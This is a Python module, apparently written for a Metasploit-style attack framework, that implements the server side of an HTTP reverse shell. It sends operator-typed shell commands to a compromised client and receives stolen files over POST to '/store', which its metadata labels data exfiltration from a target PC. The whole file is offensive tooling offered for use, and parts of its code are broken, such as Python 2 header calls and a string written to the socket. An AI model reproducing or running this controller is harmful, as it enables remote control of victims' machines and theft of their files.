import pyfiglet
from collections import OrderedDict
import http.server
import os, cgi

MODULE_TYPE = "payload"
# Module class definition
class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(s):
        command = input("Shell> ")
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(command)
    def do_POST(s):
        # Here we will use the points which we mentioned in the Client side, as a start if the "/store" was in the URL
        # then this is a POST used for file transfer so we will parse the POST header, if its value was 'multipart/form-data' then we
        # will pass the POST parameters to FieldStorage class, the "fs" object contains the returned values from FieldStorage in dictionary fashion
        if s.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(s.headers.getheader('content-type'))
                if ctype == 'multipart/form-data' :
                    fs = cgi.FieldStorage( fp = s.rfile, 
                                        headers = s.headers, 
                                        environ={ 'REQUEST_METHOD':'POST' } 
                                      )
                else:
                    print ("[-] Unexpected POST request")
                fs_up = fs['file'] # Remember, on the client side we submitted the file in dictionary fashion, and we used the key 'file'
                                    # to hold the actual file. Now here to retrieve the actual file, we use the corresponding key 'file'
                with open('/root/Desktop/1.txt', 'wb') as o: # create a file holder called '1.txt' and write the received file into this '1.txt' 
                    o.write( fs_up.file.read() )
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print (e)
            return # once we store the received file in our file holder, we exit the function
        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-Length'])
        postVar = s.rfile.read(length )
        print (postVar)
class ModuleClass(MyHandler):
    def __init__(self):
        self.info = {
            'Name': 'HTTP Data Exfiltration Server',
            'Rank':'Good',
            'Platform':'Windows/Linux/Mac',
            'architectures':'x86/64 bit processors',
            'Description': 'Http reverse shell client',
            'Note':('To be stagged to target pc , for connecting to  Http reverse shell server'),
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('URL', ('http://127.0.0.1', True,'Address link')),
            ('RPORT', ('', True,'port'))
           
               
                ])
                }
    def logo(self):
    	title = 'Reverse shell'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set URL <address> | set RPORT <port>, then run")
   
   
    def execute(self):
        self.logo()
        HOST_NAME = self.info['Options']['URL'][0]
        PORT_NUMBER = self.info['Options']['RPORT'][0]
        server_class = http.server.HTTPServer
        httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
        try:
          httpd.serve_forever()
        except KeyboardInterrupt:
          print ('[!] Server is terminated')
          httpd.server_close()
        
        
        return f"[+] Waiting for Client ..."
    